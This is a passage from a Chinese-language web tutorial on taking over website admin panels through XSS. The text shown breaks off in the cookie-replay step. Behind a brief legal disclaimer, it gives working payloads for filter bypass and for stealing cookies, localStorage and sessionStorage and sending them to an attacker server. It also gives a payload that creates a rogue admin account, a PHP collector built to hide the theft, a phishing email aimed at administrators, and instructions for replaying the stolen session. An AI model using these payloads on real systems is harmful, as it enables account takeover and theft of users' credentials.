<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../tu/xssicon.png">
    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
    <link rel="apple-touch-icon" href="../tu/xssicon.png">
    
    <meta name="description" content="详细教程：如何利用XSS漏洞实现后台登录。包含Cookie窃取、会话劫持、密码获取等多种实战技术，适合安全测试人员学习。">
    <meta name="keywords" content="XSS后台登录,会话劫持,Cookie窃取,XSS实战,后台渗透,XSS攻击教程,管理员权限获取">
    <meta name="author" content="蓝莲花XSS平台">
    <meta property="og:title" content="XSS后台登录实战完全教程 - XSS安全知识库">
    <meta property="og:description" content="从零开始学习如何通过XSS漏洞获取后台管理员权限，包含多种实战技术和防御方法">
    <meta property="og:type" content="article">
    <title>XSS后台登录实战完全教程 - XSS安全知识库</title>
    <link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../static/libs/fontawesome/css/all.min.css">
    <link rel="stylesheet" href="../static/css/style.css">
    <link rel="stylesheet" href="../static/libs/prism/css/prism-tomorrow.min.css">
    
    <style>
        .article-header {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9) 0%, rgba(0, 20, 10, 0.95) 100%);
            padding: 80px 0 40px;
            position: relative;
            overflow: hidden;
        }
        
        .article-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 65, 0.03) 0px,
                transparent 2px,
                transparent 4px
            );
            pointer-events: none;
        }
        
        .breadcrumb {
            background: transparent;
            padding: 0;
            margin-bottom: 1rem;
        }
        
        .breadcrumb-item a {
            color: var(--neon-green);
            text-decoration: none;
        }
        
        .breadcrumb-item.active {
            color: var(--text-secondary);
        }
        
        .article-title {
            font-size: 2.5rem;
            font-weight: 700;
            background: linear-gradient(45deg, #00ff41, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 1rem;
        }
        
        .article-meta {
            color: var(--text-tertiary);
            font-size: 0.9rem;
            margin-bottom: 2rem;
        }
        
        .article-content {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius);
            padding: 3rem;
            margin: 2rem 0;
        }
        
        .article-content h2 {
            color: var(--neon-green);
            font-size: 1.8rem;
            margin-top: 2.5rem;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 2px solid var(--border-color);
        }
        
        .article-content h3 {
            color: var(--text-highlight);
            font-size: 1.4rem;
            margin-top: 2rem;
            margin-bottom: 1rem;
        }
        
        .article-content h4 {
            color: var(--cyan);
            font-size: 1.2rem;
            margin-top: 1.5rem;
            margin-bottom: 0.8rem;
        }
        
        .article-content p {
            color: var(--text-secondary);
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        
        .article-content ul, .article-content ol {
            color: var(--text-secondary);
            line-height: 1.8;
            margin-bottom: 1rem;
            padding-left: 2rem;
        }
        
        .article-content li {
            margin-bottom: 0.5rem;
        }
        
        .code-block {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius);
            padding: 1.5rem;
            margin: 1rem 0;
            overflow-x: auto;
        }
        
        .code-block pre {
            margin: 0;
            color: var(--text-primary);
        }
        
        .warning-box {
            background: rgba(255, 193, 7, 0.1);
            border-left: 4px solid #ffc107;
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 4px;
        }
        
        .warning-box h4 {
            color: #ffc107;
            margin-top: 0;
        }
        
        .danger-box {
            background: rgba(220, 53, 69, 0.1);
            border-left: 4px solid #dc3545;
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 4px;
        }
        
        .danger-box h4 {
            color: #dc3545;
            margin-top: 0;
        }
        
        .info-box {
            background: rgba(0, 255, 65, 0.1);
            border-left: 4px solid var(--neon-green);
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 4px;
        }
        
        .info-box h4 {
            color: var(--neon-green);
            margin-top: 0;
        }
        
        .success-box {
            background: rgba(40, 167, 69, 0.1);
            border-left: 4px solid #28a745;
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 4px;
        }
        
        .success-box h4 {
            color: #28a745;
            margin-top: 0;
        }
        
        .toc {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius);
            padding: 1.5rem;
            margin-bottom: 2rem;
        }
        
        .toc h3 {
            color: var(--neon-green);
            font-size: 1.2rem;
            margin-bottom: 1rem;
        }
        
        .toc ul {
            list-style: none;
            padding-left: 0;
        }
        
        .toc ul ul {
            padding-left: 1.5rem;
        }
        
        .toc a {
            color: var(--text-secondary);
            text-decoration: none;
            transition: color 0.3s ease;
        }
        
        .toc a:hover {
            color: var(--neon-green);
        }
        
        .step-number {
            display: inline-block;
            width: 30px;
            height: 30px;
            background: var(--neon-green);
            color: #000;
            border-radius: 50%;
            text-align: center;
            line-height: 30px;
            font-weight: bold;
            margin-right: 10px;
        }
        
        .attack-flow {
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid var(--neon-green);
            border-radius: var(--border-radius);
            padding: 2rem;
            margin: 1.5rem 0;
        }
        
        .attack-flow h4 {
            color: var(--neon-green);
            text-align: center;
            margin-bottom: 1.5rem;
        }
        
        .flow-step {
            background: rgba(0, 255, 65, 0.05);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            position: relative;
        }
        
        .flow-step::before {
            content: '↓';
            display: block;
            text-align: center;
            color: var(--neon-green);
            font-size: 1.5rem;
            margin: 0.5rem 0;
        }
        
        .flow-step:first-child::before {
            display: none;
        }
        
        .screenshot-placeholder {
            background: rgba(0, 0, 0, 0.4);
            border: 2px dashed var(--border-color);
            border-radius: var(--border-radius);
            padding: 3rem;
            text-align: center;
            margin: 1.5rem 0;
            color: var(--text-tertiary);
        }
        
        .screenshot-placeholder i {
            font-size: 3rem;
            color: var(--neon-green);
            margin-bottom: 1rem;
            display: block;
        }
        
        .back-to-top {
            position: fixed;
            bottom: 40px;
            right: 40px;
            width: 50px;
            height: 50px;
            background: var(--neon-green);
            color: #000;
            border: none;
            border-radius: 50%;
            font-size: 1.5rem;
            cursor: pointer;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
        }
        
        .back-to-top:hover {
            transform: translateY(-5px);
            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
        }
        
        .back-to-top.show {
            opacity: 1;
            visibility: visible;
        }
    </style>
</head>
<body>
    <!-- Article Header -->
    <div class="article-header">
        <div class="container">
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb">
                    <li class="breadcrumb-item"><a href="../wiki.html"><i class="fas fa-book"></i> 知识库</a></li>
                    <li class="breadcrumb-item active">XSS后台登录实战完全教程</li>
                </ol>
            </nav>
            <h1 class="article-title">XSS后台登录实战完全教程</h1>
            <div class="article-meta">
                <span><i class="far fa-calendar"></i> 2025年1月</span>
                <span class="mx-3">|</span>
                <span><i class="far fa-clock"></i> 30分钟阅读</span>
                <span class="mx-3">|</span>
                <span><i class="fas fa-tag"></i> 攻击技术</span>
            </div>
        </div>
    </div>
    
    <!-- Main Content -->
    <div class="main-content">
        <div class="container">
            <div class="row">
                <div class="col-lg-10 offset-lg-1">
                    <!-- Warning Notice -->
                    <div class="danger-box">
                        <h4><i class="fas fa-exclamation-triangle"></i> 法律声明与道德约束</h4>
                        <p><strong>本教程仅供授权安全测试和学习研究使用！</strong></p>
                        <ul>
                            <li>未经授权访问他人系统属于<strong>违法犯罪行为</strong></li>
                            <li>请确保获得明确的书面授权再进行安全测试</li>
                            <li>仅在自己搭建的测试环境或授权范围内练习</li>
                            <li>违反法律规定造成的一切后果由行为人自负</li>
                        </ul>
                    </div>
                    
                    <!-- Table of Contents -->
                    <div class="toc">
                        <h3><i class="fas fa-list"></i> 目录</h3>
                        <ul>
                            <li><a href="#introduction">1. XSS后台登录攻击概述</a></li>
                            <li><a href="#attack-scenarios">2. 常见攻击场景</a></li>
                            <li><a href="#method1-cookie">3. 方法一：窃取管理员Cookie</a>
                                <ul>
                                    <li><a href="#cookie-step1">3.1 发现XSS注入点</a></li>
                                    <li><a href="#cookie-step2">3.2 构造Cookie窃取Payload</a></li>
                                    <li><a href="#cookie-step3">3.3 诱导管理员触发XSS</a></li>
                                    <li><a href="#cookie-step4">3.4 使用Cookie登录后台</a></li>
                                </ul>
                            </li>
                            <li><a href="#method2-password">4. 方法二：获取登录密码</a>
                                <ul>
                                    <li><a href="#password-keylogger">4.1 键盘记录器方式</a></li>
                                    <li><a href="#password-formhook">4.2 表单劫持方式</a></li>
                                    <li><a href="#password-phishing">4.3 钓鱼页面方式</a></li>
                                </ul>
                            </li>
                            <li><a href="#method3-session">5. 方法三：会话劫持技术</a></li>
                            <li><a href="#method4-backdoor">6. 方法四：植入后门脚本</a></li>
                            <li><a href="#platform-usage">7. 使用XSS平台进行攻击</a></li>
                            <li><a href="#defense">8. 防御措施</a></li>
                            <li><a href="#cases">9. 实战案例分析</a></li>
                        </ul>
                    </div>
                    
                    <!-- Article Content -->
                    <div class="article-content">
                        <h2 id="introduction">1. XSS后台登录攻击概述</h2>
                        <p>
                            XSS后台登录攻击是指利用跨站脚本漏洞，通过各种技术手段获取网站后台管理员权限的攻击方式。这是渗透测试中非常重要的一环，成功获取后台权限后，攻击者可以：
                        </p>
                        <ul>
                            <li><strong>数据窃取</strong>：访问敏感数据、用户信息、数据库内容</li>
                            <li><strong>权限提升</strong>：创建新管理员账号、修改现有账号权限</li>
                            <li><strong>网站篡改</strong>：修改网站内容、上传恶意文件</li>
                            <li><strong>横向渗透</strong>：以后台为跳板攻击内网其他系统</li>
                            <li><strong>持久化控制</strong>：植入Webshell、后门程序</li>
                        </ul>
                        
                        <div class="info-box">
                            <h4><i class="fas fa-info-circle"></i> 攻击前提条件</h4>
                            <ul>
                                <li>网站存在XSS漏洞（反射型、存储型或DOM型）</li>
                                <li>能够诱导管理员触发XSS（存储型XSS更容易）</li>
                                <li>管理员在有效会话期内（未退出登录）</li>
                                <li>或者能够捕获管理员的登录凭证</li>
                            </ul>
                        </div>
                        
                        <h2 id="attack-scenarios">2. 常见攻击场景</h2>
                        
                        <h3>场景一：用户留言/评论系统</h3>
                        <p>
                            管理员需要审核用户提交的留言、评论、反馈等内容。攻击者在这些地方插入XSS代码，当管理员查看时触发。
                        </p>
                        <div style="background: rgba(0, 0, 0, 0.4); border: 2px solid var(--neon-green); border-radius: 8px; padding: 20px; margin: 1.5rem 0;">
                            <p style="text-align: center; color: var(--neon-green); margin-bottom: 15px;"><strong>场景示意图</strong></p>
                            <svg width="100%" height="250" viewBox="0 0 900 250" style="background: #0a0a0a; border-radius: 4px;">
                                <!-- 用户 -->
                                <rect x="30" y="30" width="120" height="80" fill="#1a1a1a" stroke="#00ff41" stroke-width="2" rx="5"/>
                                <circle cx="90" cy="55" r="15" fill="#00ff41"/>
                                <path d="M 75 75 Q 90 85 105 75" stroke="#00ff41" stroke-width="2" fill="none"/>
                                <text x="90" y="105" fill="#00ff41" font-size="12" text-anchor="middle">用户</text>
                                <!-- 箭头1 -->
                                <path d="M 155 70 L 200 70" stroke="#ff4444" stroke-width="3" marker-end="url(#arrow1)"/>
                                <text x="177" y="60" fill="#ff4444" font-size="10">提交XSS</text>
                                <defs><marker id="arrow1" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><polygon points="0 0, 10 5, 0 10" fill="#ff4444"/></marker></defs>
                                <!-- 留言板 -->
                                <rect x="205" y="30" width="120" height="80" fill="#1a1a1a" stroke="#0ff" stroke-width="2" rx="5"/>
                                <text x="265" y="55" fill="#0ff" font-size="11" text-anchor="middle">留言板/评论</text>
                                <text x="265" y="75" fill="#ff4444" font-size="9" text-anchor="middle">&lt;script&gt;</text>
                                <text x="265" y="90" fill="#ff4444" font-size="9" text-anchor="middle">XSS代码</text>
                                <text x="265" y="105" fill="#ff4444" font-size="9" text-anchor="middle">&lt;/script&gt;</text>
                                <!-- 箭头2 -->
                                <path d="M 330 70 L 375 70" stroke="#00ff41" stroke-width="3" marker-end="url(#arrow2)"/>
                                <text x="352" y="60" fill="#00ff41" font-size="10">查看</text>
                                <defs><marker id="arrow2" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><polygon points="0 0, 10 5, 0 10" fill="#00ff41"/></marker></defs>
                                <!-- 管理员 -->
                                <rect x="380" y="30" width="120" height="80" fill="#1a1a1a" stroke="#ffc107" stroke-width="2" rx="5"/>
                                <circle cx="440" cy="55" r="15" fill="#ffc107"/>
                                <path d="M 425 75 Q 440 85 455 75" stroke="#ffc107" stroke-width="2" fill="none"/>
                                <text x="440" y="105" fill="#ffc107" font-size="12" text-anchor="middle">管理员</text>
                                <!-- 爆炸效果 -->
                                <circle cx="440" cy="55" r="30" fill="none" stroke="#ff4444" stroke-width="2" stroke-dasharray="5,5">
                                    <animate attributeName="r" from="30" to="45" dur="1s" repeatCount="indefinite"/>
                                    <animate attributeName="opacity" from="1" to="0" dur="1s" repeatCount="indefinite"/>
                                </circle>
                                <!-- 箭头3 -->
                                <path d="M 505 70 L 550 70" stroke="#ff4444" stroke-width="3" marker-end="url(#arrow3)"/>
                                <text x="527" y="60" fill="#ff4444" font-size="10">XSS触发</text>
                                <defs><marker id="arrow3" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><polygon points="0 0, 10 5, 0 10" fill="#ff4444"/></marker></defs>
                                <!-- 攻击者服务器 -->
                                <rect x="555" y="30" width="120" height="80" fill="#1a1a1a" stroke="#ff4444" stroke-width="2" rx="5"/>
                                <rect x="575" y="45" width="80" height="50" fill="#2a2a2a" stroke="#ff4444" stroke-width="1"/>
                                <text x="615" y="60" fill="#ff4444" font-size="10" text-anchor="middle">攻击者</text>
                                <text x="615" y="75" fill="#ff4444" font-size="10" text-anchor="middle">服务器</text>
                                <text x="615" y="90" fill="#00ff41" font-size="9" text-anchor="middle">Cookie接收</text>
                                <!-- 流程说明 -->
                                <text x="450" y="145" fill="#00ff41" font-size="11" text-anchor="middle" font-weight="bold">攻击流程：</text>
                                <text x="450" y="165" fill="#ccc" font-size="10" text-anchor="middle">1. 用户提交包含XSS的留言</text>
                                <text x="450" y="182" fill="#ccc" font-size="10" text-anchor="middle">2. 管理员在后台审核留言</text>
                                <text x="450" y="199" fill="#ccc" font-size="10" text-anchor="middle">3. XSS代码触发，Cookie被窃取</text>
                                <text x="450" y="216" fill="#ccc" font-size="10" text-anchor="middle">4. Cookie发送到攻击者服务器</text>
                            </svg>
                            <p style="text-align: center; color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">用户提交表单 → 插入XSS代码 → 管理员后台审核 → XSS触发</p>
                        </div>
                        
                        <h3>场景二：个人资料页面</h3>
                        <p>
                            用户可以编辑个人资料（昵称、签名、简介等），管理员可能会查看用户资料。在这些字段中插入XSS代码。
                        </p>
                        
                        <h3>场景三：工单/客服系统</h3>
                        <p>
                            提交工单或客服咨询时，客服人员或管理员必然会查看工单内容，这是非常理想的XSS触发场景。
                        </p>
                        
                        <h3>场景四：文件上传功能</h3>
                        <p>
                            上传包含XSS代码的文件（如SVG、HTML、XML），管理员预览或查看文件列表时触发。
                        </p>
                        
                        <div class="attack-flow">
                            <h4><i class="fas fa-sitemap"></i> 典型攻击流程</h4>
                            <div class="flow-step">
                                <strong>步骤1：侦察阶段</strong><br>
                                寻找XSS注入点，测试过滤规则，确定管理员可能访问的页面
                            </div>
                            <div class="flow-step">
                                <strong>步骤2：Payload构造</strong><br>
                                编写Cookie窃取、键盘记录或会话劫持代码
                            </div>
                            <div class="flow-step">
                                <strong>步骤3：诱导触发</strong><br>
                                通过留言、工单等方式让管理员访问含有XSS的页面
                            </div>
                            <div class="flow-step">
                                <strong>步骤4：凭证获取</strong><br>
                                接收被窃取的Cookie、密码或会话信息
                            </div>
                            <div class="flow-step">
                                <strong>步骤5：后台登录</strong><br>
                                使用获取的凭证登录后台管理系统
                            </div>
                        </div>
                        
                        <h2 id="method1-cookie">3. 方法一：窃取管理员Cookie</h2>
                        
                        <p>这是最常见也是最直接的方法。通过XSS窃取管理员的Session Cookie，然后使用Cookie登录后台。</p>
                        
                        <h3 id="cookie-step1">3.1 发现XSS注入点</h3>
                        
                        <p><span class="step-number">1</span> <strong>寻找输入点</strong></p>
                        <p>在网站上寻找所有可以输入内容的地方：</p>
                        <ul>
                            <li>用户留言板、评论区</li>
                            <li>个人资料编辑（昵称、签名、简介）</li>
                            <li>搜索框、反馈表单</li>
                            <li>工单系统、客服对话</li>
                            <li>URL参数</li>
                        </ul>
                        
                        <p><span class="step-number">2</span> <strong>测试XSS漏洞</strong></p>
                        <p>尝试插入测试代码：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-markup">&lt;!-- 基础测试 --&gt;
&lt;script&gt;alert('XSS')&lt;/script&gt;

&lt;!-- 绕过简单过滤 --&gt;
&lt;img src=x onerror=alert('XSS')&gt;
&lt;svg onload=alert('XSS')&gt;
&lt;body onload=alert('XSS')&gt;

&lt;!-- 事件处理器 --&gt;
&lt;input onfocus=alert('XSS') autofocus&gt;
&lt;marquee onstart=alert('XSS')&gt;

&lt;!-- 编码绕过 --&gt;
&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&lt;/script&gt;</code></pre>
                        </div>
                        
                        <p><span class="step-number">3</span> <strong>确认管理员会访问</strong></p>
                        <p>确保注入的XSS代码会被管理员看到。存储型XSS最理想，因为管理员必然会查看后台内容。</p>
                        
                        <div style="background: rgba(0, 0, 0, 0.4); border: 2px solid var(--neon-green); border-radius: 8px; padding: 20px; margin: 1.5rem 0;">
                            <p style="text-align: center; color: var(--neon-green); margin-bottom: 15px;"><strong>XSS注入点测试</strong></p>
                            <svg width="100%" height="320" viewBox="0 0 800 320" style="background: #0a0a0a; border-radius: 4px;">
                                <!-- 浏览器窗口 -->
                                <rect x="50" y="30" width="700" height="260" fill="#1a1a1a" stroke="#00ff41" stroke-width="2" rx="5"/>
                                <!-- 地址栏 -->
                                <rect x="60" y="40" width="680" height="30" fill="#2a2a2a" rx="3"/>
                                <text x="70" y="60" fill="#00ff41" font-size="12">https://target-site.com/message</text>
                                <!-- 留言表单 -->
                                <rect x="80" y="90" width="640" height="180" fill="#0a0a0a" stroke="#333" stroke-width="1"/>
                                <text x="100" y="110" fill="#00ff41" font-size="13" font-weight="bold">留言板</text>
                                <!-- 标题输入框 -->
                                <text x="100" y="135" fill="#ccc" font-size="11">标题：</text>
                                <rect x="100" y="140" width="600" height="25" fill="#1a1a1a" stroke="#333" stroke-width="1" rx="2"/>
                                <text x="110" y="157" fill="#888" font-size="10">网站建议</text>
                                <!-- 内容输入框 -->
                                <text x="100" y="185" fill="#ccc" font-size="11">内容：</text>
                                <rect x="100" y="190" width="600" height="50" fill="#1a1a1a" stroke="#ff4444" stroke-width="2" rx="2"/>
                                <text x="110" y="208" fill="#ff4444" font-size="9">&lt;script&gt;alert('XSS')&lt;/script&gt;</text>
                                <text x="110" y="222" fill="#888" font-size="9">&lt;img src=x onerror=alert('XSS')&gt;</text>
                                <text x="110" y="235" fill="#888" font-size="9">&lt;svg onload=alert('XSS')&gt;</text>
                                <!-- 提交按钮 -->
                                <rect x="600" y="250" width="100" height="30" fill="#00ff41" rx="3"/>
                                <text x="650" y="270" fill="#000" font-size="13" font-weight="bold" text-anchor="middle">提交</text>
                                <!-- 箭头指示 -->
                                <path d="M 400 255 L 400 275 L 385 275 L 400 295 L 415 275 L 400 275 Z" fill="#ff4444"/>
                                <!-- 提示框 -->
                                <rect x="200" y="85" width="400" height="50" fill="rgba(255,68,68,0.1)" stroke="#ff4444" stroke-width="1" rx="5"/>
                                <text x="400" y="105" fill="#ff4444" font-size="11" text-anchor="middle" font-weight="bold">测试是否存在XSS漏洞</text>
                                <text x="400" y="122" fill="#ff4444" font-size="9" text-anchor="middle">提交后查看是否弹出alert弹窗</text>
                            </svg>
                            <p style="text-align: center; color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">在留言板输入测试代码 → 提交 → 查看是否触发弹窗</p>
                        </div>
                        
                        <h3 id="cookie-step2">3.2 构造Cookie窃取Payload</h3>
                        
                        <h4>基础Cookie窃取代码</h4>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 方法1: 直接发送到远程服务器
&lt;script&gt;
var img = new Image();
img.src = 'http://your-server.com/cookie.php?c=' + encodeURIComponent(document.cookie);
&lt;/script&gt;

// 方法2: 使用fetch API
&lt;script&gt;
fetch('http://your-server.com/cookie.php', {
    method: 'POST',
    body: JSON.stringify({
        cookie: document.cookie,
        url: window.location.href,
        userAgent: navigator.userAgent
    })
});
&lt;/script&gt;

// 方法3: 使用XMLHttpRequest
&lt;script&gt;
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://your-server.com/cookie.php?c=' + document.cookie, true);
xhr.send();
&lt;/script&gt;</code></pre>
                        </div>
                        
                        <h4>绕过HttpOnly的Cookie窃取</h4>
                        
                        <p>如果Cookie设置了HttpOnly标志，无法直接通过JavaScript读取。但可以尝试以下方法：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 方法1: 劫持XMLHttpRequest，捕获请求中的Cookie
&lt;script&gt;
var originalOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
    // 拦截请求
    this.addEventListener('load', function() {
        // 发送响应到攻击者服务器
        var img = new Image();
        img.src = 'http://your-server.com/log.php?data=' + encodeURIComponent(this.responseText);
    });
    return originalOpen.apply(this, arguments);
};
&lt;/script&gt;

// 方法2: 获取页面中的CSRF Token或其他凭证
&lt;script&gt;
var token = document.querySelector('[name="csrf-token"]').content;
var img = new Image();
img.src = 'http://your-server.com/token.php?t=' + token;
&lt;/script&gt;

// 方法3: 直接在管理员会话中执行操作
&lt;script&gt;
// 创建新管理员账号
fetch('/admin/user/add', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        username: 'hacker',
        password: 'P@ssw0rd!',
        role: 'admin'
    })
});
&lt;/script&gt;</code></pre>
                        </div>
                        
                        <h4>完整的Cookie窃取Payload（带混淆）</h4>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 混淆后的Cookie窃取代码
&lt;script&gt;
(function() {
    // 收集信息
    var data = {
        cookie: document.cookie,
        url: window.location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        timestamp: new Date().toISOString()
    };
    
    // 发送到攻击者服务器
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://your-server.com/steal.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(data));
    
    // 备用方法：使用Image对象
    setTimeout(function() {
        var img = new Image();
        img.src = 'http://your-server.com/steal.php?d=' + btoa(JSON.stringify(data));
    }, 1000);
})();
&lt;/script&gt;</code></pre>
                        </div>
                        
                        <h4>接收Cookie的服务器端代码（PHP）</h4>
                        
                        <div class="code-block">
                            <pre><code class="language-php">&lt;?php
// cookie.php - 接收并保存Cookie的PHP脚本

// 设置允许跨域
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');

// 获取数据
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
    $json = json_decode($data, true);
    $cookie = $json['cookie'] ?? '';
    $url = $json['url'] ?? '';
    $userAgent = $json['userAgent'] ?? '';
} else {
    $cookie = $_GET['c'] ?? '';
    $url = $_SERVER['HTTP_REFERER'] ?? '';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
}

// 保存到文件
$logFile = 'cookies.txt';
$logData = sprintf(
    "[%s]\nCookie: %s\nURL: %s\nUser-Agent: %s\n%s\n\n",
    date('Y-m-d H:i:s'),
    $cookie,
    $url,
    $userAgent,
    str_repeat('-', 80)
);

file_put_contents($logFile, $logData, FILE_APPEND);

// 返回1x1透明图片，避免被发现
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?&gt;</code></pre>
                        </div>
                        
                        <h3 id="cookie-step3">3.3 诱导管理员触发XSS</h3>
                        
                        <p><span class="step-number">1</span> <strong>存储型XSS场景</strong></p>
                        <p>在留言板、评论区等地方提交包含XSS代码的内容：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-markup">&lt;!-- 示例：在留言板提交 --&gt;
标题: 网站建议
内容: 你好，我发现网站有个小问题...&lt;script src="http://your-server.com/xss.js"&gt;&lt;/script&gt;</code></pre>
                        </div>
                        
                        <p><span class="step-number">2</span> <strong>反射型XSS场景</strong></p>
                        <p>构造恶意链接，通过社会工程学诱导管理员点击：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-markup">&lt;!-- 示例：构造恶意链接 --&gt;
http://target-site.com/search?q=&lt;script&gt;/* XSS代码 */&lt;/script&gt;

&lt;!-- 发送给管理员的邮件内容 --&gt;
主题: 紧急：网站搜索功能异常
内容: 
管理员您好，
我在使用搜索功能时发现异常，请点击以下链接查看：
[恶意链接]
谢谢！</code></pre>
                        </div>
                        
                        <p><span class="step-number">3</span> <strong>等待触发</strong></p>
                        <p>监控你的服务器日志，等待Cookie数据到来：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-bash"># Linux服务器实时监控Cookie文件
tail -f /var/www/html/cookies.txt

# 或者使用Python简单HTTP服务器
python3 -m http.server 80

# 查看访问日志
tail -f /var/log/apache2/access.log</code></pre>
                        </div>
                        
                        <div style="background: rgba(0, 0, 0, 0.4); border: 2px solid var(--neon-green); border-radius: 8px; padding: 20px; margin: 1.5rem 0;">
                            <p style="text-align: center; color: var(--neon-green); margin-bottom: 15px;"><strong>接收到的Cookie数据示意图</strong></p>
                            <svg width="100%" height="300" viewBox="0 0 800 300" style="background: #0a0a0a; border-radius: 4px;">
                                <!-- 终端窗口 -->
                                <rect x="50" y="30" width="700" height="240" fill="#000" stroke="#00ff41" stroke-width="2" rx="5"/>
                                <!-- 标题栏 -->
                                <rect x="50" y="30" width="700" height="30" fill="#1a1a1a" rx="5" ry="0"/>
                                <circle cx="70" cy="45" r="6" fill="#ff4444"/>
                                <circle cx="90" cy="45" r="6" fill="#ffc107"/>
                                <circle cx="110" cy="45" r="6" fill="#00ff41"/>
                                <text x="400" y="50" fill="#00ff41" font-size="12" text-anchor="middle">terminal - tail -f cookies.txt</text>
                                <!-- 终端内容 -->
                                <text x="60" y="80" fill="#00ff41" font-size="10" font-family="monospace">[2025-01-23 10:30:15]</text>
                                <text x="60" y="100" fill="#0ff" font-size="10" font-family="monospace">Cookie: PHPSESSID=abc123xyz; admin_token=eyJhbGc...</text>
                                <text x="60" y="120" fill="#ccc" font-size="10" font-family="monospace">URL: http://target-site.com/admin/messages</text>
                                <text x="60" y="140" fill="#ccc" font-size="10" font-family="monospace">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)</text>
                                <text x="60" y="160" fill="#888" font-size="10" font-family="monospace">-----------------------------------------------------------</text>
                                <!-- 第二条记录 -->
                                <text x="60" y="180" fill="#00ff41" font-size="10" font-family="monospace">[2025-01-23 10:31:42]</text>
                                <text x="60" y="200" fill="#0ff" font-size="10" font-family="monospace">Cookie: session_id=xyz789abc; auth=Bearer...</text>
                                <text x="60" y="220" fill="#ccc" font-size="10" font-family="monospace">URL: http://target-site.com/admin/users</text>
                                <text x="60" y="240" fill="#ccc" font-size="10" font-family="monospace">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)</text>
                                <!-- 光标 -->
                                <rect x="60" y="248" width="8" height="12" fill="#00ff41">
                                    <animate attributeName="opacity" values="1;0;1" dur="1s" repeatCount="indefinite"/>
                                </rect>
                            </svg>
                            <p style="text-align: center; color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">cookies.txt文件内容：<br>
                            [2025-01-23 10:30:15]<br>
                            Cookie: PHPSESSID=abc123xyz; admin_token=eyJhbGc...<br>
                            URL: http://target-site.com/admin/messages<br>
                            User-Agent: Mozilla/5.0...</p>
                        </div>
                        
                        <h3 id="cookie-step4">3.4 使用Cookie登录后台</h3>
                        
                        <p>获取到Cookie后，使用浏览器的开发者工具设置Cookie并登录：</p>
                        
                        <p><span class="step-number">1</span> <strong>打开后台登录页面</strong></p>
                        <p>访问目标网站的后台地址，如：http://target-site.com/admin</p>
                        
                        <p><span class="step-number">2</span> <strong>设置Cookie</strong></p>
                        <p>按F12打开开发者工具，切换到Console（控制台），粘贴以下代码：</p>
                        
                        <div class="code-block">
                            <pre><code class="language-javascript">// 设置窃取到的Cookie
document.cookie = "PHPSESSID=abc123xyz; path=/";
document.cookie = "admin_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; path=/";

// 或者批量设置
var cookies = "PHPSESSID=abc123xyz; admin_token=eyJhbGc...";
cookies.split('; ').forEach(function(c) {
    var parts = c.split('=');
    document.cookie = parts[0] + '=' + parts[1] + '; path=/';
});

// 刷新页面
location.reload();</code></pre>
                        </div>
                        
                        <p><span class="step-number">3</span> <strong>验证登录</strong></p>
                        <p>刷新页面后，如果Cookie有效，应该会直接进入后台管理界面。</p>
                        
                        <div class="success-box">
